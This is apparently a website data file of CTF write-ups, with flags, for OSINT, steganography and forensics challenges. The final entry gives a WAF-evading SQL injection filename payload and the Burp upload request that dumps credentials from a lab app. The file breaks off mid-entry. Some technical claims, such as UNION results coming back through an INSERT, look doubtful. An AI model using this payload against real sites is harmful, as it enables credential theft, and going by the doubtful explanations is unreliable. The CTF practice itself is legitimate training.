export const writeups = [
  {
    id: 'packetcapture-the-last-breadcrumb',
    slug: 'packetcapture-the-last-breadcrumb',
    title: 'PacketCapture CTF - The Last Breadcrumb',
    platform: 'PacketCapture CTF',
    category: 'OSINT',
    difficulty: 'Expert',
    date: 'Oct 2026',
    readTime: '9 min read',
    os: 'Windows Executable / Stego',
    osLabel: 'CHALLENGE ARTIFACTS',
    ip: 'Offline / OSINT Trail',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'Forensics', 'OSINT', 'Cryptography', 'Steganography', 'GPG', 'zsteg', 'stegseek'],
    excerpt: 'An expert-level multi-stage forensics, OSINT, cryptography, and steganography challenge solving a Hansel & Gretel riddle through a hidden YouTube Short clue, PGP keyservers, RGB color decomposition, Mastodon bio clues, dictionary-cracked steganalysis, and unlisted video rabbit holes.',
    userFlag: 'PacketCapture{mofsj7hk44wtsh762nv46lt3bnprcmttbaqxknux66rnaddmyd}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Artifacts'
      },
      {
        type: 'paragraph',
        text: 'We were provided with an executable (SyncCenterUpdater.exe), a text file (signature.txt), an image (flag.png), and a riddle based on the story of Hansel and Gretel:'
      },
      {
        type: 'code',
        code: `Riddle:
"One left a breadcrumb for you to find, keep chasing after the first trail they left.
Reunite the two, I beg. The other is found in a crossroad, one path leads to the sibling, the other to a wrong key."`
      },
      {
        type: 'heading',
        text: '2. Step 1: The First Breadcrumb (Sibling 1)'
      },
      {
        type: 'paragraph',
        text: 'The file signature.txt contained the string F5C4612C8848B517DBE7FFE64D7D300D33AC69B3. This string is actually the title of a YouTube Short by a channel named "PacketCapture".'
      },
      {
        type: 'paragraph',
        text: 'Inspecting the YouTube channel and video metadata revealed key leads:'
      },
      {
        type: 'code',
        code: `Channel Name:        PacketCapture
Channel Description: "A mastodon can only handle 30"
Video Title:         F5C4612C8848B517DBE7FFE64D7D300D33AC69B3
Video Description:   "magentatexture"`
      },
      {
        type: 'paragraph',
        text: 'Searching keyserver.ubuntu.com using mastodon.me revealed the public key for M4g3NtaTxtre <magenta@mastodon.me> with the fingerprint beec005b27aa0b7d4e28c2f12db40739512ee2f2. This is Sibling 1.'
      },
      {
        type: 'code',
        code: `$ gpg --keyserver hkps://keyserver.ubuntu.com --recv-keys beec005b27aa0b7d4e28c2f12db40739512ee2f2
gpg: key 512EE2F2: public key "M4g3NtaTxtre <magenta@mastodon.me>" imported
gpg: Total number processed: 1
gpg:               imported: 1`
      },
      {
        type: 'heading',
        text: '3. Step 2: The Crossroad (Steganography)'
      },
      {
        type: 'paragraph',
        text: 'The hint mentioned a "crossroad" where one path leads to a sibling, and the other to a "wrong key". The image provided was flag.png, which was entirely colored Magenta.'
      },
      {
        type: 'paragraph',
        text: 'In RGB color theory, Magenta is a crossroad composed of exactly two paths: Red and Blue.'
      },
      {
        type: 'paragraph',
        text: 'Using zsteg to analyze the color channels independently, we found:'
      },
      {
        type: 'code',
        code: `$ zsteg -a flag.png
[+] Red Path (b1,r,msb,yx,prime):
    "4#7l9%erZ"  --> Distraction (The hint literally stated this was the "wrong key")

[+] Blue Path (b7,b,msb,xy,prime):
    Checkerboard visual noise pattern identified as deprecated PGP Secret Sub-key (v3)`
      },
      {
        type: 'paragraph',
        text: '• The Red Path: Extracting the Red channel (b1,r,msb,yx,prime) revealed the text string 4#7l9%erZ. The hint literally stated this was the "wrong key".\n• The Blue Path: Extracting the Blue channel (b7,b,msb,xy,prime) revealed a massive checkerboard pattern of visual noise, which zsteg identified as a deprecated PGP Secret Sub-key (v3).'
      },
      {
        type: 'heading',
        text: '4. Step 3: Following the Trail (OSINT & Rabbit Holes)'
      },
      {
        type: 'paragraph',
        text: 'Since modern GnuPG strictly blocks importing v3 legacy keys, we needed another path. The first sibling gave us an email: magenta@mastodon.me. Searching for this user led to the Mastodon account @M4g3NtaTxtre (username: irCgPekP6sg).'
      },
      {
        type: 'paragraph',
        text: 'Their bio contained a trail of clues:\n• A YouTube short about the Source Engine "Missing Texture" (a pink/black checkerboard, explaining the visual noise in the Blue channel).\n• A Reddit link to r/MissingTexture.\n• A MediaFire link to an image named onionfromdinoera.jpg.'
      },
      {
        type: 'paragraph',
        text: 'The filename onionfromdinoera is a pun for Bulbasaur, pointing to Steganography (stegosaurus). Running a dictionary attack on the image using stegseek and rockyou.txt cracked the passphrase in seconds:'
      },
      {
        type: 'code',
        code: `$ stegseek onionfromdinoera.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
[i] Progress: 98.42% (131.2MB / 133.4MB)
[+] Found passphrase: "missing"
[+] Extracting to "onionfromdinoera.jpg.out"`
      },
      {
        type: 'paragraph',
        text: 'Passphrase found: "missing". This extracted a hidden file named shhh.txt, containing another MediaFire link to a file named: PacketCapture{0ld_k3ys_n0_W0rr1es}.asc.'
      },
      {
        type: 'paragraph',
        text: 'This file contained a valid PGP Private Key block (Sibling 2), allowing us to formally reunite the siblings in our keychain. However, the flag format in the filename was a troll ("Old keys no worries"), mocking our earlier struggle with the legacy v3 key.'
      },
      {
        type: 'heading',
        text: '5. Step 4: Finding Their House (The Solution)'
      },
      {
        type: 'paragraph',
        text: 'The final hint stated: "Found the two siblings? Great. Go back to the breadcrumb trail and you\'ll find their house."'
      },
      {
        type: 'paragraph',
        text: 'Reviewing the Mastodon account, the account name was @M4g3NtaTxtre, but the internal Mastodon username ID was irCgPekP6sg.'
      },
      {
        type: 'paragraph',
        text: 'Recognizing the format of the username, we realized the "house" was another YouTube Shorts URL:'
      },
      {
        type: 'code',
        code: `https://www.youtube.com/shorts/irCgPekP6sg`
      },
      {
        type: 'paragraph',
        text: 'Navigating to this unlisted video, the final payload was resting in plain text in the video\'s description:'
      },
      {
        type: 'code',
        code: `Mofsj7hk44wtsh762nv46lt3bnprcmttbaqxknux66rnaddmyd`
      },
      {
        type: 'paragraph',
        text: 'Wrapping this in the required challenge format yielded the true flag:'
      },
      {
        type: 'code',
        code: `PacketCapture{mofsj7hk44wtsh762nv46lt3bnprcmttbaqxknux66rnaddmyd}`
      }
    ]
  },
  {
    id: 'packetcapture-silent-observer',
    slug: 'packetcapture-silent-observer',
    title: 'PacketCapture CTF - Silent Observer',
    platform: 'PacketCapture CTF',
    category: 'OSINT',
    difficulty: 'Medium',
    date: 'October 2026',
    readTime: '6 min read',
    os: 'Image Artifact (PNG)',
    osLabel: 'CHALLENGE ARTIFACT',
    ip: 'Web / Social / what3words',
    ipLabel: 'TARGET SCOPE',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'OSINT', 'Geolocation', 'Metadata', 'what3words', 'Base64', 'ROT13'],
    excerpt: 'An investigative OSINT challenge analyzing hidden EXIF metadata in an image, tracking an anonymous social media trail on X, decoding Base64 and ROT13 pivot domains, and pinpointing a Tokyo establishment via what3words.',
    userFlag: 'PacketCapture{+81366570748}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Brief'
      },
      {
        type: 'paragraph',
        text: 'The challenge provided an image file (absolute.png, 1.9 MB) accompanied by a cryptic intelligence briefing:'
      },
      {
        type: 'code',
        code: `Challenge Brief (Base Points: 150):
"Not everything that watches announces itself. We recovered an image — nothing special at first glance.
But images carry more than what's on the surface, and this one was shared without anyone checking what came with it.
Somewhere out there is a person who thinks they're careful. They post like everyone does. They think their words are anonymous.
They're not. Follow what the picture doesn't say. Someone left a way to reach them — you just have to know where to look,
and where to go once you find it. Reservations here aren't taken online — someone still has to actually call.
If you want to reach them, you'll need to find the number first."`
      },
      {
        type: 'heading',
        text: '2. Step 1: Metadata Analysis (EXIF Extraction)'
      },
      {
        type: 'paragraph',
        text: 'We began the investigation by analyzing the provided 1.9 MB image (absolute.png) using ExifTool to inspect hidden metadata:'
      },
      {
        type: 'code',
        code: `$ exiftool absolute.png
File Name                       : absolute.png
File Size                       : 1.9 MB
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 1920
Image Height                    : 1080
Artist                          : @Skye_Chi14
Warning                         : [minor] Trailer data after PNG IEND chunk`
      },
      {
        type: 'paragraph',
        text: 'While the trailing data after the PNG IEND chunk initially appeared to be a steganography red herring, the EXIF Artist tag revealed a crucial OSINT pivot handle: @Skye_Chi14.'
      },
      {
        type: 'heading',
        text: '3. Step 2: OSINT Reconnaissance (Social Media Investigation)'
      },
      {
        type: 'paragraph',
        text: 'Using the extracted handle, we investigated their social presence on X (Twitter) via https://twitterviewer.net/ to review target account @Skye_Chi14.'
      },
      {
        type: 'paragraph',
        text: 'Analyzing the timeline revealed two critical posts made on July 30 and July 31, 2026:'
      },
      {
        type: 'code',
        code: `Post 1: "Z2J6bHFybmVyZmcua2xt"
Post 2: "isn't it kind of sweet, searching your name on some anonymous platform just to see if anyone left you a message"`
      },
      {
        type: 'heading',
        text: '4. Step 3: Decrypting the Pivot Domain (Base64 & ROT13)'
      },
      {
        type: 'paragraph',
        text: 'The second post hinted at searching their name on an anonymous messaging platform. We analyzed the ciphertext string from the first post (Z2J6bHFybmVyZmcua2xt):'
      },
      {
        type: 'code',
        code: `$ echo "Z2J6bHFybmVyZmcua2xt" | base64 -d
gbzlqrnerfg.klm

$ echo "gbzlqrnerfg.klm" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
tomydearest.xyz`
      },
      {
        type: 'paragraph',
        text: '• Step 3a - Base64 Decode: Decodes to "gbzlqrnerfg.klm".\n• Step 3b - ROT13 Decryption: Decrypts cleanly to the target platform domain: tomydearest.xyz.'
      },
      {
        type: 'heading',
        text: '5. Step 4: Surfacing the Anonymous Message'
      },
      {
        type: 'paragraph',
        text: 'Navigating to tomydearest.xyz, we used the search feature to query the target\'s name: "Skye Chi".'
      },
      {
        type: 'paragraph',
        text: 'This surfaced a hidden message left by an anonymous user checking in on Skye. The message concluded with an unusual 3-word sign-off:'
      },
      {
        type: 'code',
        code: `Message Sign-off:
wishes.slap.repeats`
      },
      {
        type: 'heading',
        text: '6. Step 5: Geolocation via what3words'
      },
      {
        type: 'paragraph',
        text: 'The three-word format (word.word.word) is the distinctive signature of what3words, a proprietary geocode system that indexes every 3m x 3m square on Earth.'
      },
      {
        type: 'paragraph',
        text: 'Searching ///wishes.slap.repeats on the what3words map pinpointed an exact 3x3 meter location in Tokyo, Japan, directly identifying the physical establishment: Café Capybara.'
      },
      {
        type: 'code',
        code: `what3words Coordinates: ///wishes.slap.repeats
Location:               Tokyo, Japan
Identified Venue:       Café Capybara`
      },
      {
        type: 'heading',
        text: '7. Step 6: Flag Construction'
      },
      {
        type: 'paragraph',
        text: 'Referring back to the original challenge briefing:\n"Reservations here aren\'t taken online — someone still has to actually call. If you want to reach them, you\'ll need to find the number first."'
      },
      {
        type: 'paragraph',
        text: 'We queried public business directories for Café Capybara in Tokyo to find their official public contact telephone number, which is +81366570748.'
      },
      {
        type: 'paragraph',
        text: 'Formatting the phone number inside the PacketCapture flag wrapper produced the final flag:'
      },
      {
        type: 'code',
        code: `PacketCapture{+81366570748}`
      }
    ]
  },
  {
    id: 'packetcapture-under-construction',
    slug: 'packetcapture-under-construction',
    title: 'PacketCapture CTF - Under Construction',
    platform: 'PacketCapture CTF',
    category: 'OSINT / History',
    difficulty: 'Easy',
    date: 'October 2026',
    readTime: '4 min read',
    os: 'Open-Source Intelligence',
    osLabel: 'CHALLENGE TYPE',
    ip: 'Web History / Archival',
    ipLabel: 'TARGET SCOPE',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'OSINT', 'Web History', 'GeoCities', 'Yahoo'],
    excerpt: 'An internet history and OSINT challenge deciphering cultural artifacts from the early web era—blinking text, visitor counters, and chaotic homepages—to identify Yahoo! GeoCities and uncover the exact date it was permanently shut down.',
    userFlag: 'PacketCapture{GEOCITIES_26OCT2009}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Mission Brief'
      },
      {
        type: 'paragraph',
        text: 'The challenge presented a nostalgic historical riddle regarding a vanished cornerstone of the early World Wide Web:'
      },
      {
        type: 'code',
        code: `Mission Brief (75 Base PTS):
"Before it was gone, it was everywhere. Millions of pages, each one someone's first attempt at building something online.
Blinking text, guestbooks, visitor counters — a whole era of the internet built by people who had no idea what they were doing
and didn't care. Then one day, without much warning, it was all deleted. On purpose. All at once.
Find out what it was called, and the exact date it disappeared for good."

Flag Format: PacketCapture{NAME_DDMONYEAR}`
      },
      {
        type: 'heading',
        text: '2. Step 1: Analyzing Cultural Clues & Identifying the Service'
      },
      {
        type: 'paragraph',
        text: 'The mission brief detailed hallmarks of late 1990s web culture:\n• "Blinking text, guestbooks, visitor counters"\n• "Millions of pages, each one someone\'s first attempt at building something online"\n• Deleted en masse, all at once on purpose'
      },
      {
        type: 'paragraph',
        text: 'These cultural markers, paired with the challenge title "Under Construction" (evoking the omnipresent animated GIF banners of early personal sites), unequivocally pointed to Yahoo! GeoCities—the iconic web hosting service founded in 1994.'
      },
      {
        type: 'heading',
        text: '3. Step 2: Determining the Official Shutdown Date'
      },
      {
        type: 'paragraph',
        text: 'Archival and internet history records document that Yahoo! announced the termination of GeoCities earlier in 2009, subsequently wiping and pulling the plug on millions of websites simultaneously on:'
      },
      {
        type: 'code',
        code: `Service Name:         GeoCities
Parent Company:       Yahoo!
Official Closure:     October 26, 2009`
      },
      {
        type: 'heading',
        text: '4. Step 3: Flag Construction'
      },
      {
        type: 'paragraph',
        text: 'The challenge required the flag components to follow the format PacketCapture{NAME_DDMONYEAR} in uppercase:'
      },
      {
        type: 'code',
        code: `NAME:       GEOCITIES
DDMONYEAR:  26OCT2009

Final Flag: PacketCapture{GEOCITIES_26OCT2009}`
      }
    ]
  },
  {
    id: 'packetcapture-forgotten-repository',
    slug: 'packetcapture-forgotten-repository',
    title: 'PacketCapture CTF - Forgotten Repository',
    platform: 'PacketCapture CTF',
    category: 'OSINT',
    difficulty: 'Easy',
    date: 'October 2026',
    readTime: '3 min read',
    os: 'Git / GitHub Public Repository',
    osLabel: 'CHALLENGE ARTIFACT',
    ip: 'https://github.com/SkyeChi/sentry-relay',
    ipLabel: 'TARGET SCOPE',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'OSINT', 'Git', 'GitHub', 'Commit History', 'Diff Analysis'],
    excerpt: 'An OSINT and Git forensics challenge recovering a deleted flag from a sanitized public repository by inspecting commit history and executing git grep across all historical references.',
    userFlag: 'PacketCapture{L34K3D_R3P0_D1SC0V3R3D_DAB2A78}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Mission Brief'
      },
      {
        type: 'paragraph',
        text: 'The challenge pointed to a seemingly abandoned and sanitized public repository with the following brief:'
      },
      {
        type: 'code',
        code: `Mission Brief (50 Base PTS):
"Every organization leaves something behind — code nobody bothered to delete.
We traced a fragment of internal infrastructure to a public repository.
Looks abandoned. Cleaned up. Nothing worth noting, if you only look at what's there now.
But nothing is ever really deleted. It's just harder to find."

Target Scope: https://github.com/SkyeChi/sentry-relay
Flag Format: PacketCapture{...}`
      },
      {
        type: 'heading',
        text: '2. Vulnerability & Clue Analysis'
      },
      {
        type: 'paragraph',
        text: 'The briefing highlights that while the repository appears "cleaned up", "nothing is ever really deleted". This is a classic indication of sensitive data committed to Git version control and subsequently deleted in a later commit. Because Git retains the entire commit tree and diff history, deleted secrets remain permanently retrievable unless purged with tools like git-filter-repo or BFG Repo-Cleaner.'
      },
      {
        type: 'heading',
        text: '3. Method 1: GitHub Web Interface'
      },
      {
        type: 'paragraph',
        text: '1. Navigate to the target repository URL on GitHub (https://github.com/SkyeChi/sentry-relay).\n2. Click on the "Commits" tab to review the historical change log.\n3. Identify commits mentioning cleanups or credential sanitization — specifically commit 55a64f3 titled "remove exposed credentials".\n4. Inspect the commit diff: in config.env, line -API_KEY=PacketCapture{L34K3D_R3P0_D1SC0V3R3D_DAB2A78} was removed.'
      },
      {
        type: 'heading',
        text: '4. Method 2: Command Line (Git Inspection)'
      },
      {
        type: 'paragraph',
        text: 'For a swift automated extraction across all branches and commits, clone the repository and search the entire revision log locally:'
      },
      {
        type: 'code',
        code: `# Clone the target repository
$ git clone https://github.com/SkyeChi/sentry-relay.git
$ cd sentry-relay

# Grep across all historical commit objects
$ git grep 'PacketCapture{' $(git rev-list --all)
55a64f36012e2e7092bb0da490bf85e8bd255199:config.env: API_KEY=PacketCapture{L34K3D_R3P0_D1SC0V3R3D_DAB2A78}`
      },
      {
        type: 'paragraph',
        text: 'The command traverses every tree object in the Git revision graph and immediately outputs the exact commit SHA, file, and line harboring the flag.'
      },
      {
        type: 'heading',
        text: '5. Flag Recovery'
      },
      {
        type: 'paragraph',
        text: 'Extracting the API key from the commit history reveals the flag:'
      },
      {
        type: 'code',
        code: `PacketCapture{L34K3D_R3P0_D1SC0V3R3D_DAB2A78}`
      }
    ]
  },
  {
    id: 'packetcapture-registry-secrets',
    slug: 'packetcapture-registry-secrets',
    title: 'PacketCapture CTF - Registry Secrets',
    platform: 'PacketCapture CTF',
    category: 'Forensics / Reverse Engineering',
    difficulty: 'Medium',
    date: 'October 2026',
    readTime: '4 min read',
    os: 'NTFS Master File Table ($MFT)',
    osLabel: 'CHALLENGE ARTIFACT',
    ip: 'Offline / Binary Analysis',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'Forensics', 'Reverse Engineering', 'NTFS', '$MFT', 'Alternate Data Streams', 'Single-Byte XOR'],
    excerpt: 'Analyzing an NTFS Master File Table ($MFT) artifact misleadingly named after Windows Registry keys, uncovering an unexpected Alternate Data Stream (ADS) in update_agent.dll, and recovering the flag via single-byte XOR decryption.',
    userFlag: 'PacketCapture{3ch0_1n_7h3_r36157ry}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview'
      },
      {
        type: 'paragraph',
        text: 'The challenge presented a binary artifact with clues pointing toward Windows Registry keys. However, preliminary triage and file signature analysis revealed that the file was an NTFS Master File Table ($MFT) record dump rather than registry hives.'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:    Registry Secrets
Platform: PacketCapture CTF
Category: Forensics / Reverse Engineering
Target:   Raw Binary Artifact`
      },
      {
        type: 'heading',
        text: '2. Step 1: Initial Reconnaissance & Triage'
      },
      {
        type: 'paragraph',
        text: 'Despite the challenge title and description pointing toward Windows Registry keys, inspecting the raw binary file reveals the classic NTFS record magic header (FILE*). The file is a collection of 1024-byte NTFS Master File Table ($MFT) records.'
      },
      {
        type: 'paragraph',
        text: 'Most records contain standard Windows binaries (services.exe, notepad.exe, cmd.exe, etc.) with a dummy resident $DATA string: "System file content holder.". However, record #7 (update_agent.dll) contains an unexpected Alternate Data Stream (ADS) named zone.identifier.'
      },
      {
        type: 'code',
        code: `# Inspecting binary header and extracted records
Header: FILE* (NTFS MFT record signature)
Record size: 1024 bytes

Record #7: update_agent.dll
  ├── Resident $DATA (Default): "System file content holder."
  └── Resident $DATA (ADS):    update_agent.dll:zone.identifier (35 bytes)`
      },
      {
        type: 'heading',
        text: '3. Step 2: Extracting the Hidden Payload'
      },
      {
        type: 'paragraph',
        text: 'The resident data within the update_agent.dll:zone.identifier ADS contains a 35-byte obfuscated ciphertext string.'
      },
      {
        type: 'heading',
        text: '4. Step 3: Decryption via Single-Byte XOR'
      },
      {
        type: 'paragraph',
        text: 'Testing single-byte XOR keys against the structure reveals that key 0x3C (60 in decimal) successfully decodes the entire ciphertext into readable text and leetspeak, yielding the final flag:'
      },
      {
        type: 'code',
        code: `# Decrypting with single-byte XOR key 0x3C (60)
key = 0x3C
ciphertext = bytes([...])  # 35-byte extracted payload

flag = bytes([b ^ key for b in ciphertext]).decode('utf-8')
print(flag)
# Output: PacketCapture{3ch0_1n_7h3_r36157ry}`
      },
      {
        type: 'heading',
        text: '5. Flag Recovery'
      },
      {
        type: 'paragraph',
        text: 'Successfully decoding the obfuscated payload yields the verified flag:'
      },
      {
        type: 'code',
        code: `PacketCapture{3ch0_1n_7h3_r36157ry}`
      }
    ]
  },
  {
    id: 'packetcapture-deleted-doesnt-mean-gone',
    slug: 'packetcapture-deleted-doesnt-mean-gone',
    title: "PacketCapture CTF - Deleted Doesn't Mean Gone",
    platform: 'PacketCapture CTF',
    category: 'Digital Forensics',
    difficulty: 'Easy',
    date: 'October 2026',
    readTime: '3 min read',
    os: 'Raw Disk Image (evidence.dd)',
    osLabel: 'CHALLENGE ARTIFACT',
    ip: 'Offline / Sector Analysis',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'Forensics', 'Digital Forensics', 'File Carving', 'binwalk', 'ZIP Magic Bytes', 'Unallocated Space'],
    excerpt: "Recovering a confidential document from an unallocated raw sector image (evidence.dd) of a wiped backup array using forensic file carving with binwalk to extract an embedded ZIP archive.",
    userFlag: 'PacketCapture{RECOVERED_DOCUMENT}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Brief'
      },
      {
        type: 'paragraph',
        text: "Node-7's backup array was wiped at 03:14 UTC. Whoever did it assumed that deleting a file destroys it. A raw sector image (evidence.dd) was pulled from the array before the drive was decommissioned. Somewhere in that image, the original document survives — the filesystem just doesn't know it exists anymore."
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:       Deleted Doesn't Mean Gone
Platform:    PacketCapture CTF
Category:    Digital Forensics
Artifact:    evidence.dd (Raw sector disk image)`
      },
      {
        type: 'heading',
        text: '2. Step 1: Initial Reconnaissance'
      },
      {
        type: 'paragraph',
        text: "When a filesystem index is wiped, the underlying binary data often remains intact in the unallocated space. We are provided with a raw sector dump (evidence.dd). Running standard string analysis or inspecting the hex dump reveals the file signature PK\\x03\\x04 alongside plaintext metadata for a file named confidential_report.txt. This confirms a ZIP archive is embedded directly within the disk's noise."
      },
      {
        type: 'code',
        code: `$ strings evidence.dd | grep -i "report"
confidential_report.txt

# Inspecting hex dump reveals PK\\x03\\x04 (ZIP local file header: 50 4b 03 04)`
      },
      {
        type: 'heading',
        text: '3. Step 2: File Carving with Binwalk'
      },
      {
        type: 'paragraph',
        text: 'Because the filesystem allocation tables are gone, we cannot mount the image normally. Instead, we have to carve the target file out of the raw bytes based on its magic headers. Working within a standard Linux forensics environment (like Kali or Ubuntu), binwalk is the most efficient tool for this operation.'
      },
      {
        type: 'paragraph',
        text: 'First, we verify the file signatures and offsets across the raw image:'
      },
      {
        type: 'code',
        code: `$ binwalk evidence.dd

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1048576       0x100000        Zip archive data, at least v2.0 to extract, compressed size: ...`
      },
      {
        type: 'paragraph',
        text: 'This maps the contents, returning the exact decimal offset where the hidden ZIP archive begins.'
      },
      {
        type: 'heading',
        text: '4. Step 3: Payload Extraction'
      },
      {
        type: 'paragraph',
        text: 'To isolate and automatically unpack the embedded archive, we execute binwalk again, this time leveraging the extraction flag:'
      },
      {
        type: 'code',
        code: `$ binwalk -e evidence.dd

# Alternatively, manual carving via dd:
$ dd if=evidence.dd of=recovered.zip bs=1 skip=<OFFSET>
$ unzip recovered.zip`
      },
      {
        type: 'heading',
        text: '5. Step 4: Capturing the Flag'
      },
      {
        type: 'paragraph',
        text: 'Binwalk successfully carves the archive and unpacks it into a newly generated directory named _evidence.dd.extracted. Navigating into this directory reveals the preserved payload: confidential_report.txt.'
      },
      {
        type: 'code',
        code: `$ cat _evidence.dd.extracted/confidential_report.txt
PacketCapture{RECOVERED_DOCUMENT}`
      },
      {
        type: 'heading',
        text: '6. Conclusion & Takeaways'
      },
      {
        type: 'paragraph',
        text: 'This challenge practically demonstrates that relying on standard operating system deletion methods—which only remove file pointers from the master file table or inode index—is insufficient for secure data destruction. The raw data persists on the sectors in unallocated space and remains easily recoverable through standard forensic file carving techniques.'
      },
      {
        type: 'code',
        code: `PacketCapture{RECOVERED_DOCUMENT}`
      }
    ]
  },
  {
    id: 'packetcapture-black-box',
    slug: 'packetcapture-black-box',
    title: 'PacketCapture CTF - Black Box',
    platform: 'PacketCapture CTF',
    category: 'Web Exploitation',
    difficulty: 'Medium',
    date: 'October 2026',
    readTime: '6 min read',
    os: 'Python (Flask) / SQLite',
    osLabel: 'TECH STACK',
    ip: 'https://blackbox.challs.packetcapture.xyz/',
    ipLabel: 'TARGET SCOPE',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'Web Exploitation', 'SQL Injection', 'SQLite', 'WAF Bypass', 'File Upload', 'Polyglot'],
    excerpt: 'Exploiting a filename-based SQL injection vulnerability in a Flask/SQLite text-to-ASCII art web application by constructing a polyglot payload with inline comments, case alternation, char() functions, and block comments to evade multiple WAF layers.',
    userFlag: 'PacketCapture{1nj3ct_m3_8decaf00}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Brief'
      },
      {
        type: 'paragraph',
        text: 'Black Box is a web exploitation challenge featuring a Flask application backed by an SQLite database. The application provides a simple "Text to ASCII arts" conversion tool where users can upload image files (.jpg, .jpeg, .png).'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:      Black Box
Platform:   PacketCapture CTF
Category:   Web Exploitation
Difficulty: Medium
Target:     https://blackbox.challs.packetcapture.xyz/
Hint:       "One of the software developers had a hobby project. Confined within the black box, the way inside is not what you seem."`
      },
      {
        type: 'heading',
        text: '2. Reconnaissance & Surface Analysis'
      },
      {
        type: 'paragraph',
        text: 'Reviewing the application interface and leaked source hints revealed crucial characteristics:\n• Tech Stack: The footer explicitly identifies the application as built on Flask and SQLite. All SQL injection syntax must adhere to SQLite specifications (such as using || for string concatenation).\n• Upload Constraints: Allowed file extensions are strictly limited to .jpg, .jpeg, and .png; null-byte (%00) injection is strictly filtered.\n• Attack Vector: The clue "the way inside is not what you seem" steers us away from traditional input parameters. Since there are no other user-facing input fields, the vulnerability lies directly in how the uploaded filename is passed to the backend database (likely an INSERT query).'
      },
      {
        type: 'heading',
        text: '3. Vulnerability Analysis & Filter Bypasses'
      },
      {
        type: 'paragraph',
        text: 'Injecting a standard SQL injection payload into the filename parameter:\n\' UNION SELECT group_concat(username || \':\' || password) FROM users--.jpg\nimmediately triggered Web Application Firewall (WAF) blocks: "Spaces are not allowed in file names" and "SQL injection detected".'
      },
      {
        type: 'paragraph',
        text: 'To defeat the WAF regex filters while still satisfying the application\'s extension validation, we engineered a multi-stage bypass:'
      },
      {
        type: 'paragraph',
        text: '• Step 1: Whitespace Filter Bypass (Inline Comments)\nSpaces are banned by the WAF. We substitute all spaces with SQLite block comments /**/. The database parser treats /**/ as valid token separation, while bypassing space-detection regexes:\n\'/**/UNION/**/SELECT/**/.../**/FROM/**/users--.jpg'
      },
      {
        type: 'paragraph',
        text: '• Step 2: WAF Keyword Detection Bypass (Case Variation & UNION ALL)\nThe WAF signature matches the literal string UNION SELECT. We bypass this signature using mixed-case casing and switching to UNION ALL:\n\'/**/uNiOn/**/AlL/**/sElEcT/**/group_concat(username||...||password)/**/fRoM/**/users/*'
      },
      {
        type: 'paragraph',
        text: '• Step 3: String Literal Filtering (char() Function)\nThe WAF inspects quoted string literals such as \':\' used for credential delimiter concatenation. In SQLite, we replace the colon string with char(58), avoiding quotes altogether:\ngroup_concat(username||char(58)||password)'
      },
      {
        type: 'paragraph',
        text: '• Step 4: Extension Validation & Comment Termination (/*)\nThe server enforces that the uploaded filename ends with a valid extension (.jpg, .jpeg, or .png). Appending --.png can fail if the query does not include a newline. Instead, we terminate the injection with an unclosed block comment /* followed by .png:\nBy naming the file ending in /*.png, the file validator sees a valid extension, while SQLite treats /* as the start of a multi-line comment, discarding the trailing quotation mark and remaining SQL syntax.'
      },
      {
        type: 'code',
        code: `# Final Constructed Polyglot Filename Payload:
'/**/uNiOn/**/AlL/**/sElEcT/**/group_concat(username||char(58)||password)/**/fRoM/**/users/*.png`
      },
      {
        type: 'heading',
        text: '4. Exploitation via Burp Suite'
      },
      {
        type: 'paragraph',
        text: 'We configured Burp Suite to intercept the multipart POST request during the image upload and swapped the benign filename with our crafted polyglot payload:'
      },
      {
        type: 'code',
        code: `POST /upload HTTP/1.1
Host: blackbox.challs.packetcapture.xyz
Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575

-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="file"; filename="'/**/uNiOn/**/AlL/**/sElEcT/**/group_concat(username||char(58)||password)/**/fRoM/**/users/*.png"
Content-Type: image/png

[PNG binary dummy data]
-----------------------------974767299852498929531610575--`
      },
      {
        type: 'paragraph',
        text: 'Backend Query Interpretation:\nThe backend executed the dynamic query into the SQLite database:\nINSERT INTO uploads (filename) VALUES (\'\'/**/uNiOn/**/AlL/**/sElEcT/**/group_concat(username||char(58)||password)/**/fRoM/**/users/*.png\')\nBecause of the trailing /* block comment, everything past the comment boundary was ignored, and the second query returned the concatenated database users directly into the application\'s response output.'
      },
      {
        type: 'heading',
        text: '5. Flag Recovery'
      },
      {
        type: 'paragraph',
        text: 'The server responded with the rendered page containing the dumped database records:'
      },
      {
        type: 'code',
        code: `Extracted Database Output:
admin:PacketCapture{1nj3ct_m3_8decaf00}`
      },
      {
        type: 'heading',
        text: '6. Conclusion & Key Takeaways'
      },
      {
        type: 'paragraph',
        text: 'This challenge highlights how file upload filenames can serve as potent SQL injection vectors when passed unparameterized into backend queries. Exploiting it required chained filter evasion: comment-based whitespace evasion (/**/), mixed-case WAF evasion (uNiOn AlL sElEcT), dynamic char(58) string building, and comment-cloaked extension validation (/*.png).'
      },
      {
        type: 'code',
